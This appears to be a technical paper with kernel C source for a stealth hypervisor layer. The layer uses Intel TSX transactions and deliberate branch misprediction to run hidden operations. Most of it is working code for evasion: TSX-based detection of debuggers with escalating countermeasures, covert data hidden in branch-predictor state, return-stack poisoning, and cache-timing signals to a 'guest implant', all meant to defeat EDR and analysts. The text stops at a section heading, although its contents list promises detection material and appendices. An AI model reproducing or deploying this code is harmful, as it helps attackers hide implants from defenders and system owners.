# The Speculative Engine



## Abstract

A hypervisor that touches memory leaves traces. A hypervisor that touches registers leaves traces. A hypervisor that writes MSRs leaves traces. Every architecturally committed operation is observable by a guest with timing gadgets, an analyst with Intel PT, or an EDR with PMC sampling.

So we built a hypervisor layer that commits nothing.

The Speculative Engine (Layer #1 of the SEM architecture) performs its critical operations like integrity checks, control signal propagation, and guest manipulation inside speculative execution windows. On Intel hardware with TSX support, these windows are bounded RTM transactions that abort before commit. On hardware without TSX, they use deliberately mis-trained branch misprediction gadgets. Either way the CPU executes the instructions, the microarchitectural state changes like caches getting populated, branch predictors getting trained, and TLBs getting primed, but no architectural register, memory location, or MSR is modified.

The result is a hypervisor that operates purely through side-effects. Its signal lives in the noise floor of the branch predictor, encrypted with a ChaCha20 keystream and buried under xoshiro256** entropy flooding. Detecting it requires distinguishing a few hundred biased BTB entries from the ~32K entries of normal noise, a statistical problem with no known efficient solution when the signal-to-noise ratio is below -30dB.

This paper documents how it works, why it works, what breaks it, and what we learned building it.

---

## Table of Contents

1. [The Problem: Architecturally-Visible Hypervisor Operations](#the-problem)
2. [Intel TSX as a Speculation Primitive](#intel-tsx)
3. [The Speculative Window: Enter and Leave](#the-speculative-window)
4. [Abort Classification and Adaptive Retry](#abort-classification)
5. [Anti-Instrumentation via TSX](#anti-instrumentation)
6. [Branch Misprediction Fallback](#branch-misprediction-fallback)
7. [BTB Signal Encoding](#btb-signal-encoding)
8. [BTB Signal Decoding: Statistical Sampling](#btb-signal-decoding)
9. [RSB Manipulation](#rsb-manipulation)
10. [Guest Modification via Microarchitectural Side-Effects](#guest-modification)
11. [The Entropic Cloak](#the-entropic-cloak)
12. [Integration: How the Layers Compose](#integration)
13. [Detection and Limitations](#detection-and-limitations)
14. [Empirical Results](#empirical-results)
15. [Appendix A: Data Structures](#appendix-a)
16. [Appendix B: xoshiro256** Implementation](#appendix-b)
17. [Appendix C: ChaCha20 in Kernel Mode](#appendix-c)
18. [Appendix D: Platform Compatibility](#appendix-d)
19. [Appendix E: Debugging Notes](#appendix-e)
20. [Appendix F: Operational Considerations](#appendix-f)
21. [Appendix G: Detection Engineering Playbook](#appendix-g)

---

## The Problem: Architecturally-Visible Hypervisor Operations {#the-problem}

Every VM-exit handler does work. It reads guest state, computes a response, writes guest state back. That work leaves architectural traces:

| Operation | Trace left | Who can see it |
|-----------|-----------|----------------|
| Write to guest memory | Page table dirty bit, cache line ownership | Guest with `clflush` + timing |
| Read from MSR | None directly, but the RDMSR itself causes a VM-exit if intercepted | Nested hypervisor, Intel PT |
| Modify EPT entry | TLB flush on target core, INVEPT broadcast | Guest with TLB-probing gadgets |
| Execute CPUID response logic | Instruction cache residency, branch predictor training | Guest with Flush+Reload or branch timing |
| Any non-trivial computation | PMC increments (retired instructions, branch mispredicts, cache misses) | EDR with PMC sampling, Intel PT |

The traditional approach is to minimize these traces by being fast, touching few cache lines, and avoiding predictable branch patterns. But minimize is not eliminate. A sufficiently motivated analyst with hardware performance counters will always see statistical anomalies in a VM-exiting guest vs bare-metal.

Our approach is different. Instead of trying to be invisible by being small, we make all operations produce zero architectural residue and then drown whatever microarchitectural residue remains in synthetic noise that is statistically indistinguishable from genuine system entropy.

Two problems to solve:
1. Execute hypervisor logic without committing architectural state
2. Hide the microarchitectural residue in noise

The Speculative Engine solves #1. The Entropic Cloak (covered later in this paper) solves #2. Together they form the stealth substrate that everything else in the SEM architecture builds on.

---

## Intel TSX as a Speculation Primitive {#intel-tsx}

### Background

Intel Transactional Synchronization Extensions (TSX) were designed for lock elision. You run a critical section speculatively, commit atomically if no conflicts, abort and retry with a lock if there are conflicts. The hardware provides two interfaces: Hardware Lock Elision (HLE, deprecated) and Restricted Transactional Memory (RTM).

RTM gives you `XBEGIN` and `XEND`. Between them, the CPU executes speculatively. All stores go into a write buffer, all loads are tracked in a read set. If anything conflicts like another core writing to a cache line in your read set, a debugger setting a breakpoint, an interrupt firing, or exceeding L1D capacity, the CPU aborts the entire transaction. All architectural state rolls back to the `XBEGIN` point. Nothing happened. The CPU provides an abort status code explaining why.

We don't use TSX for lock elision. We use it as a bounded speculative execution container. We enter a transaction, do work that modifies microarchitectural state like cache residency, branch predictor entries, and TLB hints, and then either deliberately abort or let the transaction commit with zero net architectural effect.

### Why TSX and Not Just Speculative Execution

Spectre-style speculative execution like branch misprediction and store-to-load forwarding gives you a speculation window too. But:

1. Unbounded duration. A mispredicted branch resolves when the branch unit catches up. You don't control how long the window stays open. On Skylake it is roughly 100-200 instructions before the reorder buffer fills. On newer cores it varies.

2. No commit option. With TSX, you can choose to commit making the work architecturally real or abort making it disappear. Spectre-style windows always squash so you can never commit work done speculatively through a misprediction.

3. Observable recovery. When a branch mispredicts and squashes, the pipeline flush is visible in PMC counters (`BR_MISP_RETIRED`). TSX aborts don't increment the misprediction counter. They have their own event (`RTM_RETIRED.ABORTED`) which most EDR products don't monitor.

TSX gives us a controlled, bounded container with commit/abort semantics and less PMC visibility. That is why it is the primary speculation substrate.

### Detection and Availability

```c
BOOLEAN SemSpeculativeDetectTsx(void)
{
    int cpuInfo[4];
    __cpuid(cpuInfo, 7);
    // EBX bit 11 = RTM
    if (cpuInfo[1] & (1 << 11)) {
        // Additional check: try one transaction to verify not disabled by BIOS
        unsigned int status = _xbegin();
        if (status == 0) {
            _xend();
            return TRUE;
        }
        return FALSE;
    }
    return FALSE;
}
```

CPUID alone is not enough. BIOS or firmware can disable TSX via `IA32_TSX_CTRL` MSR (0x122) even when the CPU supports it. Intel microcode updates since 2019 allow this. We try an actual transaction to confirm it works.

Platforms where TSX is available and functional:
- Haswell through Coffee Lake (i7-4xxx through i9-9xxx) generally available
- Comet Lake (10th gen) available but sometimes disabled by microcode update
- Rocket Lake and Alder Lake and later TSX deprecated, often absent entirely

On AMD TSX does not exist. AMD never implemented it. We fall back to branch misprediction gadgets (Section 6).

### The Dual-Purpose Nature

We use TSX for two things:
1. Speculative window (this section) execute logic inside a transaction, let it abort or commit depending on what we need
2. Anti-instrumentation (Section 5) detect debuggers by observing that transactions abort with `DEBUG` status when a hardware breakpoint is set inside them

Same hardware mechanism, two different operational uses. The transaction is both our workspace and our tripwire.

---

## The Speculative Window: Enter and Leave {#the-speculative-window}

The core primitive is simple: enter a speculative window, do work, leave.

```c
#pragma optimize("", off)
u64 SemSpeculativeEnterWindow(SEM_SPECULATIVE_CTX* s)
{
    s->Epoch++;
    g_SemCtx.TsxAttempts++;

    if (s->RtmAvailable && g_SemCtx.SpeculativeEnabled) {
        for (int attempt = 0; attempt < 3; attempt++) {
            unsigned int status = _xbegin();
            if (status == 0) {
                return 0;  // inside transaction
            }

            g_SemCtx.TsxAborts++;
            u8 abortCode = (u8)(status & XABORT_STATUS_MASK);

            if (abortCode & XABORT_RETRY) {
                _mm_pause();
                continue;
            }
            if (abortCode & XABORT_CAPACITY) {
                break;  // too large, fall back
            }
            if (abortCode & XABORT_CONFLICT) {
                for (volatile int delay = 0; delay < (attempt + 1) * 16; delay++) {
                    _mm_pause();
                }
                continue;
            }
            break;
        }

        // TSX failed. Check if we should disable it entirely.
        if (g_SemCtx.TsxAttempts > 100) {
            u64 rate = (g_SemCtx.TsxAborts * 1000ULL) / g_SemCtx.TsxAttempts;
            g_SemCtx.TsxAbortRateX1000 = (u32)rate;
            if (rate > 800) {
                g_SemCtx.SpeculativeEnabled = FALSE;
                s->RtmAvailable = FALSE;
                g_SemCtx.TsxAttempts = 0;
                g_SemCtx.TsxAborts = 0;
            }
        }
    }

    // Fallback: branch misprediction window
    volatile u64 token = s->Epoch ^ 0xDEADBEEFCAFEBABEULL;
    volatile u64 sink = 0;
    volatile BOOLEAN* condPtr = (volatile BOOLEAN*)&token;

    for (int train = 0; train < 16; train++) {
        if (*condPtr != 0) {
            sink ^= train;
        }
    }

    if (*condPtr == 0) {
        sink ^= 0xCAFEBABE;
    }
    (void)sink;
    return token;
}

void SemSpeculativeLeaveWindow(SEM_SPECULATIVE_CTX* s, u64 token)
{
    if (s->RtmAvailable && token == 0) {
        _xend();
    }
}
#pragma optimize("", on)
```

The `#pragma optimize("", off)` is mandatory. Without it, MSVC will look at the TSX code and optimize it away because the function has no observable side-effects after the abort path. We spent a day tracking down why our transactions were getting compiled into nothing before figuring this out. The compiler is technically correct because from an architectural perspective an aborted transaction does nothing, but we need the microarchitectural effects.

### The Token Protocol

`EnterWindow` returns a token:
- `0` means we are inside a TSX transaction. The caller does their work, then calls `LeaveWindow` which issues `_xend()`.
- Non-zero means we are in the misprediction fallback path. `LeaveWindow` is a no-op.

This lets callers be agnostic about which speculation substrate they are running on:

```c
u64 token = SemSpeculativeEnterWindow(s);
{
    // do speculative work here
    // modifies caches, BTB, TLB — but not architectural state
}
SemSpeculativeLeaveWindow(s, token);
```

### What Inside the Transaction Actually Means

Inside `_xbegin()` ... `_xend()`:
- All stores are buffered in the L1D write buffer. If the transaction commits, they become visible atomically. If it aborts, they vanish.
- All loads are tracked. If another core writes to any cache line we have read, we abort.
- Hardware breakpoints trigger an abort with `XABORT_DEBUG` status.
- Interrupts trigger an abort unless masked, but we cannot mask all of them in Ring 0 without raising suspicion.
- Exceeding L1D capacity typically ~16KB of write set triggers `XABORT_CAPACITY`.

For our purposes we do not usually care if the transaction commits or aborts. We want the side-effects like the cache lines that get loaded and the branch predictor entries that get trained during the transaction execution. Those microarchitectural effects persist regardless of whether the transaction commits or aborts. That is the entire insight.

A load inside a transaction populates L1D. If the transaction aborts, the data is no longer architecturally valid from the transaction perspective, but the cache line is still resident. The cache does not get flushed on abort, only the write buffer is discarded. This is what we exploit.

---

## Abort Classification and Adaptive Retry {#abort-classification}

RTM abort status is a bitmask (Intel SDM Vol. 2, `XBEGIN` instruction reference):

| Bit | Name | Meaning |
|-----|------|---------|
| 0 | EXPLICIT | Transaction was explicitly aborted via `_xabort()` |
| 1 | RETRY | CPU suggests retrying (transient conflict) |
| 2 | CONFLICT | Another core wrote to our read set |
| 3 | CAPACITY | Write set exceeded L1D capacity |
| 4 | DEBUG | Hardware breakpoint or single-step detected |
| 5 | NESTED | Aborted inside a nested transaction |

We classify aborts differently depending on what caused them:

RETRY (bit 1): Transient conflict, probably from a timer interrupt or scheduler activity on a sibling hyperthread. Retry immediately with a single `_mm_pause()` to yield to the other thread.

CAPACITY (bit 3): Our transaction is too big for the hardware. This is not a transient condition so retrying will not help because the write set will always overflow. We fall through to the misprediction fallback. In practice this means we tried to do too much work in one window. We restructured our operations to stay under ~8KB of writes per transaction, which keeps us well within L1D on any Skylake-derived core.

CONFLICT (bit 2): Another core touched a cache line in our read set. This is intermittent and depends on what else the system is doing. We retry with exponential backoff. First retry waits 16 pause iterations, second waits 32, third waits 48. The randomized delay reduces the probability of repeated conflicts with the same core.

DEBUG (bit 4): Someone is trying to debug us. This is the anti-instrumentation signal, see Section 5. We do not retry. We log it and potentially escalate countermeasures.

Everything else: Do not retry. Something unexpected happened. Fall through to misprediction fallback.

### Graceful Degradation

We track a rolling abort rate across the last 100+ attempts. If aborts exceed 80% (800/1000), the speculative engine disables itself entirely and falls back to standard hypervisor operation. This can happen when:

- The system is under extreme memory pressure with constant L1D evictions
- A debugging tool is aggressively instrumenting the kernel
- Intel released a microcode update that broke TSX which happened in 2019, 2020, and 2022

The hypervisor continues to function but it loses its speculative stealth. We would rather be a working hypervisor than a stealth hypervisor that crashes. The decision was deliberate. The reliability module (`sem_reliability.c`) can re-enable the speculative layer once abort rates drop below 20% for 1000 consecutive attempts.

---

## Anti-Instrumentation via TSX {#anti-instrumentation}

This is the trick that makes TSX invaluable beyond just speculation windows.

### The Mechanism

When a hardware breakpoint (DR0-DR3) or single-step flag (EFLAGS.TF) is active inside a transaction region, the CPU aborts the transaction before the breakpoint exception is delivered to the debugger. The abort status has bit 4 (DEBUG) set. The debugger never gets control inside the transaction. The CPU rolls back to `XBEGIN` and reports the abort.

This means if we wrap security-critical checks inside a transaction, a debugger physically cannot break on them. The best an analyst can do is set a breakpoint at `XBEGIN` or after `XEND`, never inside.

### Implementation

```c
BOOLEAN SemTsxTransact(SEM_TSX_CTX* ctx,
                        void (*fn)(void*),
                        void* arg,
                        u32* abortStatus)
{
    if (!ctx || !ctx->Active || !fn) {
        if (abortStatus) *abortStatus = 0xFFFFFFFF;
        return FALSE;
    }

    ctx->TransactionsAttempted++;

    unsigned int status = _xbegin();
    if (status == _XBEGIN_STARTED) {
        fn(arg);
        _xend();
        ctx->TransactionsCommitted++;
        if (abortStatus) *abortStatus = 0;
        return TRUE;
    }

    if (abortStatus) *abortStatus = status;

    if (status & TSX_ABORT_DEBUG) {
        ctx->DebugAbortsDetected++;
        ctx->ConsecutiveDebugAborts++;
    } else if (status & TSX_ABORT_CONFLICT) {
        ctx->ConflictAborts++;
        ctx->ConsecutiveDebugAborts = 0;
    } else if (status & TSX_ABORT_CAPACITY) {
        ctx->CapacityAborts++;
        ctx->ConsecutiveDebugAborts = 0;
    } else {
        ctx->OtherAborts++;
        ctx->ConsecutiveDebugAborts = 0;
    }

    if (ctx->ConsecutiveDebugAborts >= 3) {
        ctx->InstrumentationAlert = TRUE;
    }

    return FALSE;
}
```

### Escalation Policy

One debug abort means nothing. It could be the kernel debugger briefly attaching during a crash dump or a stray hardware breakpoint from a previous debugging session that was not cleaned up. We have seen stale DR entries on production systems.

Three consecutive debug aborts means someone is actively trying to instrument our code. At that point we set `InstrumentationAlert = TRUE` and the next VM-exit handler checks this flag:

```c
void SemTsxOnVmExit(SEM_TSX_CTX* ctx)
{
    if (!ctx || !ctx->Active) return;

    if (ctx->InstrumentationAlert) {
        // Escalate:
        // 1. Increase entropic noise intensity
        // 2. Disable complex anti-detection paths
        // 3. Reset alert state
        ctx->InstrumentationAlert = FALSE;
        ctx->ConsecutiveDebugAborts = 0;
    }
}
```

What escalate means in practice:
- Increase noise injection from the entropic layer with more cache line pollution, more branch predictor flooding, and more power noise
- Temporarily disable the more sophisticated responses like CPUID filtering and RDTSC variance injection that are likely being targeted
- Switch to a simpler, harder-to-distinguish operation mode
- Optionally alert the operator via the covert channel that analysis is in progress

The reasoning is if they are instrumenting us, they already know something is there. At that point stealth is about making it harder to understand what we are doing, not hiding that we exist.

### Code Integrity Checking

We wrap integrity checks inside transactions to make them unbreakpointable:

```c
BOOLEAN SemTsxCheckCodeIntegrity(SEM_TSX_CTX* ctx, volatile u64* checksum,
                                 u64 expected, BOOLEAN* instrumented)
{
    SEM_TSX_INTEGRITY_ARG arg;
    arg.ptr = checksum;
    arg.expected = expected;
    arg.result = 0;

    u32 abortStatus = 0;
    BOOLEAN committed = SemTsxTransact(ctx, SemTsxCbCheckIntegrity,
                                       &arg, &abortStatus);

    if (instrumented) {
        *instrumented = (abortStatus & TSX_ABORT_DEBUG) != 0;
    }

    return committed && (arg.result == 1);
}
```

If someone hooks our integrity-check function and sets a breakpoint inside it to see what we are comparing, the transaction aborts before their breakpoint fires. They never see the comparison happen. We know they tried because of the DEBUG abort, and the check itself returns FALSE because it was not committed, which we interpret as integrity compromised or under analysis so we take protective action.

### Limitations of TSX Anti-Instrumentation

Things this does not protect against:
- Setting a breakpoint at `_xbegin` itself. The transaction has not started yet, so there is nothing to abort.
- Binary patching. If they overwrite the `XBEGIN` instruction with `NOP`, the transaction never happens.
- PMC-based monitoring. Intel PT or PMC sampling does not trigger transaction aborts.
- Whole-system tracing via nested hypervisor. A hypervisor below us can intercept everything.

It specifically protects against:
- WinDbg hardware breakpoints inside transacted code
- EDR kernel callbacks that rely on hooking
- DBI frameworks like PIN and DynamoRIO that inject debug traps
- Single-stepping through the transaction with the TF flag

---

## Branch Misprediction Fallback {#branch-misprediction-fallback}

On CPUs without TSX (all AMD, recent Intel with TSX stripped), we need another speculation substrate. The fallback uses deliberate branch misprediction to create a window where the CPU executes instructions speculatively before realizing the branch was taken the wrong way.

### How It Works

```c
// Train branch: condition is TRUE for 16 iterations
volatile u64 token = s->Epoch ^ 0xDEADBEEFCAFEBABEULL;
volatile u64 sink = 0;
volatile BOOLEAN* condPtr = (volatile BOOLEAN*)&token;

for (int train = 0; train < 16; train++) {
    if (*condPtr != 0) {
        sink ^= train;
    }
}

// Flip condition: now the CPU mispredicts
if (*condPtr == 0) {
    sink ^= 0xCAFEBABE;
}
```

The branch predictor sees the condition as TRUE for 16 iterations. On the 17th check (the flipped condition), the predictor still expects TRUE and speculatively executes the taken path. This creates a window of roughly 100-200 instructions depending on ROB size where we can do work that affects caches and predictors before the misprediction resolves and squashes.

### Differences From TSX Windows

| Property | TSX Window | Misprediction Window |
|----------|-----------|---------------------|
| Duration | Controlled (until `_xend` or abort) | Uncontrolled (~100-200 insns) |
| Commit option | Yes (`_xend` commits) | No (always squashes) |
| Debug detection | Yes (bit 4 in abort status) | No |
| PMC visibility | `RTM_RETIRED.ABORTED` event | `BR_MISP_RETIRED` event |
| Platform support | Intel Haswell-Coffee Lake only | All x86 CPUs |
| Capacity limit | ~16KB L1D write set | ROB depth |

The misprediction fallback is universal but weaker. No commit option, no debug detection, and it increments the branch misprediction counter which a PMC-monitoring EDR could theoretically flag. It is the fallback, not the preferred path.

### Why 16 Training Iterations

The branch predictor on modern Intel and AMD cores has multiple levels including a fast loop predictor that recognizes patterns up to roughly 16 iterations, a local history table, and a global history buffer. Training for 16 iterations ensures all levels of the predictor are confident in the branch direction. Fewer iterations and the predictor might not be strongly biased enough to mispredict on the flip. More iterations waste time and add detectable branch-loop patterns.

We tested 8, 16, 32, and 64 training iterations on Skylake, Coffee Lake, and Zen 2. 16 gave reliable misprediction on all three. 8 was flaky on Zen 2 because AMD TAGE predictor is more conservative. 32+ worked but added unnecessary training overhead.

---

## BTB Signal Encoding {#btb-signal-encoding}

The Branch Target Buffer (BTB) is a CPU structure that predicts the target address of indirect branches. When an indirect `CALL` or `JMP` executes, the BTB uses the branch virtual address (tag) to look up the predicted target. If the prediction is correct, the CPU avoids a pipeline flush.

We use this as a covert storage medium. By training specific BTB entries with specific targets, we can encode bits of data in the predictor state. The data persists as long as the BTB entries are not evicted by other branches.

### Encoding Scheme

We encode 2 bits per BTB slot using target address alignment:

```
00 → target aligned +0 (mod 4)
01 → target aligned +1 (mod 4)
10 → target aligned +2 (mod 4)
11 → target aligned +3 (mod 4)
```

The BTB stores the target address. When we probe the slot, we can determine which alignment the target was trained to, which tells us the 2-bit symbol.

```c
void SemSpeculativeEncodeBtbSignal(SEM_SPECULATIVE_CTX* s,
                                   SEM_ENTROPIC_CTX* e,
                                   const u8* signalBits, u32 bitLen)
{
    u32 slotsNeeded = (bitLen + 1) / 2;
    if (slotsNeeded > SEM_BTB_FLOOD_SIZE) slotsNeeded = SEM_BTB_FLOOD_SIZE;

    u32 startSlot = (u32)(XoshiroNext(&e->NoisePrng[4]) % SEM_BTB_FLOOD_SIZE);

    for (u32 i = 0; i < slotsNeeded; i++) {
        u32 idx = (startSlot + i) % SEM_BTB_FLOOD_SIZE;
        SEM_BTB_SIGNAL_SLOT* slot = &s->BtbSlots[idx];
        slot->Valid = 1;
        slot->IsSignal = 1;

        u8 bits = 0;
        u32 bitPos = i * 2;
        if (bitPos < bitLen)
            bits |= (signalBits[bitPos / 8] >> (bitPos % 8)) & 1;
        if ((bitPos + 1) < bitLen)
            bits |= (((signalBits[bitPos / 8] >> ((bitPos + 1) % 8)) & 1) << 1);

        slot->Tag = XoshiroNext(&e->NoisePrng[4]) | 0xFFFF000000000000ULL;
        slot->Target = ((u64)&slot->Tag) + (bits & 3);
        slot->StreamMask = (u8)(XoshiroNext(&e->NoisePrng[4]) & 0xFF);
    }

    s->BtbSignalCount = slotsNeeded;

    // Flood remaining BTB with entropic noise
    SemEntropicFloodBranchPredictor(e);
}
```

Key details:

1. Randomized start slot. We do not always encode starting at BTB slot 0. The start position is PRNG-derived, so an observer cannot predict which BTB entries carry our signal.

2. The flood. After encoding our signal in a few hundred slots, we flood the remaining ~4000 BTB slots with pure noise from the entropic layer. An observer probing the BTB sees maximum entropy everywhere and our signal is buried.

3. StreamMask. Each signal slot records which noise streams cover it. This is used during decoding to know which PRNG state to replay for verification.

### Capacity

With `SEM_BTB_FLOOD_SIZE = 4096` slots and 2 bits per slot, we could theoretically encode 8192 bits (1KB) in the BTB. In practice we use ~64-128 slots for signal (128-256 bits of actual data) and flood the rest with noise. The signal-to-noise ratio in the BTB is therefore ~128/4096 ≈ 3%. Without knowing the PRNG seed (which is derived from PUF material), distinguishing signal slots from noise slots requires brute-forcing a 256-bit keyspace.

---

## BTB Signal Decoding: Statistical Sampling {#btb-signal-decoding}

Decoding is harder than encoding. We cannot just read the BTB because it is not architecturally accessible. We have to infer its state by executing indirect branches and measuring whether the prediction was correct (fast) or incorrect (slow).

### The Problem With Naive Probing

The first version of the decoder just did:
1. Set up an indirect branch pointing at a known target
2. Measure RDTSC before and after the branch
3. If fast then BTB predicted correctly so the slot is trained
4. If slow then BTB missed so the slot is untrained

This did not work. Single RDTSC measurements are dominated by noise like interrupts, cache misses, hyperthread contention, and OS scheduling. A single measurement tells you almost nothing.

### The Statistical Approach

We replaced single-shot measurement with a rigorous sampling protocol:

```c
#define BTB_PROBE_SAMPLES    32
#define BTB_PROBE_WARMUP      4

static volatile void (*g_BtbTrampoline)(void) = NULL;

__declspec(noinline) static void BtbTrampolineTarget(void)
{
    _mm_lfence();
}

static u64 BtbProbeSingle(void)
{
    u64 t0, t1;
    _mm_lfence();
    _mm_lfence();
    t0 = __rdtsc();
    _mm_lfence();
    g_BtbTrampoline();
    _mm_lfence();
    t1 = __rdtsc();
    _mm_lfence();
    return t1 - t0;
}

static u64 BtbProbeMedian(u32 sampleCount)
{
    u64 samples[BTB_PROBE_SAMPLES];
    u32 validSamples = 0;

    // Warmup
    for (int w = 0; w < BTB_PROBE_WARMUP; w++) {
        (void)BtbProbeSingle();
    }

    // Collect
    for (u32 i = 0; i < sampleCount; i++) {
        u64 latency = BtbProbeSingle();
        if (latency > 0 && latency < 200) {
            samples[validSamples++] = latency;
        }
    }

    if (validSamples == 0) return 100;

    // Sort (insertion sort — small N)
    for (u32 i = 1; i < validSamples; i++) {
        u64 key = samples[i];
        s32 j = (s32)i - 1;
        while (j >= 0 && samples[j] > key) {
            samples[j + 1] = samples[j];
            j--;
        }
        samples[j + 1] = key;
    }

    // IQR median: discard bottom/top quartiles
    u32 q1 = validSamples / 4;
    u32 q3 = (validSamples * 3) / 4;
    if (q3 <= q1) q3 = q1 + 1;

    u64 sum = 0;
    u32 count = 0;
    for (u32 i = q1; i < q3; i++) {
        sum += samples[i];
        count++;
    }
    return (count > 0) ? (sum / count) : samples[validSamples / 2];
}
```

### Why This Design

Warmup phase (4 samples discarded): The first few measurements after setting `g_BtbTrampoline` are noisy because the I-cache and BTB are cold for this specific call site. We throw these away.

32 samples per slot: Enough to get a stable median. We tested with 8, 16, 32, and 64. At 8 the variance was too high for reliable decoding. At 64 the time cost was unacceptable because each probe takes roughly 50 cycles × 64 = roughly 3200 cycles, times 128 signal slots = roughly 410K cycles per decode pass. 32 was the sweet spot.

Discard outliers (IQR): Interrupts can spike a measurement to >1000 cycles. Those samples are garbage. We take only the interquartile range (middle 50%) and average it. This gives us a robust central tendency estimate.

< 200 cycle filter: Anything above 200 cycles is definitely not a normal branch prediction latency because it is an interrupt or VM-exit. Discard it.

Volatile function pointer: This is the part that took us a while to figure out. If you just use a regular indirect call, the compiler might devirtualize it or the CPU might use its indirect-call predictor instead of the BTB. A volatile function pointer through a global forces a real indirect `CALL` instruction that must consult the BTB. Without this, our probes were measuring the wrong predictor structure.

### Calibration

Before decoding, we calibrate what "untrained" looks like on this specific CPU:

```c
static u64 BtbCalibrateUntrainedLatency(SEM_SPECULATIVE_CTX* s,
                                         SEM_ENTROPIC_CTX* e,
                                         u32 slotIdx)
{
    // Flood BTB with unrelated targets to evict our slot
    for (int i = 0; i < 256; i++) {
        g_BtbTrampoline = (volatile void (*)(void))(
            (u64)BtbTrampolineTarget + ((i * 64) % 4096));
        (void)BtbProbeSingle();
    }
    _mm_lfence();

    // Measure untrained latency
    g_BtbTrampoline = BtbTrampolineTarget;
    u64 untrained = BtbProbeMedian(16);
    return untrained;
}
```

We flood the BTB with 256 unrelated targets to evict any existing training, then measure the baseline. This baseline is CPU-specific. Skylake has different BTB latencies than Coffee Lake, which differs from Zen. The threshold for trained vs untrained is computed as the midpoint between trained and untrained baselines, clamped to [6, 14] cycles.

### Retry Logic

Sometimes a slot appears untrained even though we encoded it, usually because guest branch activity evicted it. We retry up to 3 times:

```c
for (int retry = 0; retry < 3 && !decoded; retry++) {
    g_BtbTrampoline = (volatile void (*)(void))slot->Target;
    u64 latency = BtbProbeMedian(BTB_PROBE_SAMPLES);

    if (latency <= predictThreshold) {
        decoded = TRUE;
        break;
    } else {
        // Re-train: execute the branch 16 times
        for (int t = 0; t < 16; t++) {
            (void)BtbProbeSingle();
        }
        _mm_lfence();
    }
}
```

If after 3 retries the slot is still unreliable, we mark it as an erasure and default to `00`. This is acceptable because our signal encoding includes error correction at a higher layer, so a few erased bits do not corrupt the message.

---

## RSB Manipulation {#rsb-manipulation}

The Return Stack Buffer (RSB) predicts return addresses. Every `CALL` pushes the return address onto the RSB and every `RET` pops and predicts. If we can control what is in the RSB, we can control where the CPU speculatively executes on the next `RET` instruction, even if the architectural return address is somewhere else entirely.

### Poisoning

```c
void SemSpeculativePoisonRsb(SEM_SPECULATIVE_CTX* s, u64 target)
{
    if (s->RsbIndex < SEM_RSB_DEPTH) {
        s->RsbShadow[s->RsbIndex++] = target;
    }

    // Train the hardware RSB
    volatile u64 sink = target;
    for (int i = 0; i < 16; i++) {
        (void)SemRsbPushTrampoline();
    }
    (void)sink;
}
```

`SemRsbPushTrampoline` is a `__declspec(noinline)` function that returns immediately. Each call pushes a return address onto the hardware RSB. After 16 calls, the RSB is filled with `SemRsbPushTrampoline` return site, which we can manipulate by adjusting where we call from.

### Flushing

```c
void SemSpeculativeFlushRsb(SEM_SPECULATIVE_CTX* s)
{
    s->RsbIndex = 0;
    for (int i = 0; i < SEM_RSB_DEPTH; i++) {
        s->RsbShadow[i] = (u64)&s->RsbShadow[0];
    }

    // Hardware flush via deep call chain
    volatile u64 dummy = 0;
    for (int i = 0; i < 32; i++) {
        (void)SemRsbFlush1();
    }
    (void)dummy;
}
```

The flush chain is a set of nested `noinline` functions:

```c
__declspec(noinline) static u64 SemRsbFlush8(void) { return 8; }
__declspec(noinline) static u64 SemRsbFlush7(void) { return SemRsbFlush8() + 7; }
__declspec(noinline) static u64 SemRsbFlush6(void) { return SemRsbFlush7() + 6; }
__declspec(noinline) static u64 SemRsbFlush5(void) { return SemRsbFlush6() + 5; }
__declspec(noinline) static u64 SemRsbFlush4(void) { return SemRsbFlush5() + 4; }
__declspec(noinline) static u64 SemRsbFlush3(void) { return SemRsbFlush4() + 3; }
__declspec(noinline) static u64 SemRsbFlush2(void) { return SemRsbFlush3() + 2; }
__declspec(noinline) static u64 SemRsbFlush1(void) { return SemRsbFlush2() + 1; }
```

Each call pushes a new entry onto the RSB. 8 deep × 32 iterations = 256 pushes. The RSB on Intel cores is 16-32 entries deep and varies by microarchitecture, so we overflow it many times over. After flushing, all entries point to known-safe addresses (`&s->RsbShadow[0]`), preventing any stale speculative returns into hypervisor shadow regions that might leak information.

### Why We Care About RSB

The RSB matters for two reasons:

1. Preventing speculative leaks. If a `RET` inside guest code speculatively returns to a hypervisor address because the RSB is stale from a previous VM-exit, the speculative execution might touch hypervisor pages and leave cache residue. Flushing the RSB before VMRESUME prevents this.

2. Covert signaling. By controlling RSB contents, we can control where the CPU speculatively fetches code on a `RET`. This creates a prefetch side-channel because we can force cache lines to be loaded speculatively without any architectural load. This is useful for the same cache-residency manipulation we do in `SemSpeculativeModifyGuest`.

---

## Guest Modification via Microarchitectural Side-Effects {#guest-modification}

This is the payoff. We can influence guest-observable state without writing anything architecturally:

```c
void SemSpeculativeModifyGuest(SEM_SPECULATIVE_CTX* s,
                               u64 guestGpa, u8 actionType)
{
    u64 token = SemSpeculativeEnterWindow(s);
    {
        if (actionType == 0x01) {
            // Prefetch: populate L1D
            _mm_prefetch((const char*)(u64)guestGpa, _MM_HINT_T0);
        } else if (actionType == 0x02) {
            // Touch: populate TLB
            volatile u8* ptr = (volatile u8*)(u64)guestGpa;
            (void)*ptr;
        } else if (actionType == 0x03) {
            // Evict: remove from cache
            _mm_clflush((void*)(u64)guestGpa);
        }
    }
    SemSpeculativeLeaveWindow(s, token);
}
```

### Action Types

0x01 Prefetch (L1D population):
`_mm_prefetch` is a hint instruction. Inside a TSX transaction, it still causes the CPU to fetch the cache line into L1D. Even if the transaction aborts, the cache line remains resident. A guest timing access to that address will see a cache hit where it expected a miss. This can be used to signal check this address or to pre-warm data that the guest will need.

0x02 TLB Touch:
A speculative load populates the TLB translation for that guest physical address. The guest will see a TLB hit on next access. This is subtler than cache prefetch because TLB residency is harder to probe from userland.

0x03 Cache Eviction:
`_mm_clflush` evicts a cache line. Inside a speculative window, the eviction still takes effect on the microarchitectural cache state. The guest will see a cache miss where it expected a hit. This can be used to invalidate stale data or to create a timing signal.

### What This Enables

In combination with the EPT split-view layer:
- The hypervisor can signal the guest implant by prefetching specific mailbox addresses
- The implant checks its mailbox addresses with Flush+Reload timing
- If the address is unexpectedly cached then the hypervisor sent a signal
- This communication channel leaves zero architectural trace on the hypervisor side
- On the guest side, it looks like normal cache behavior because cache hits happen naturally

The signal bandwidth is low roughly 64 bits per VM-exit window at best, but it is completely invisible to architectural-level analysis.

---

## The Entropic Cloak {#the-entropic-cloak}

The Speculative Engine produces microarchitectural residue like trained BTB entries, cache lines, and TLB entries. These are theoretically detectable by a sophisticated observer with full cache-state visibility. The Entropic Cloak job is to make that residue statistically indistinguishable from noise.

### Design Philosophy

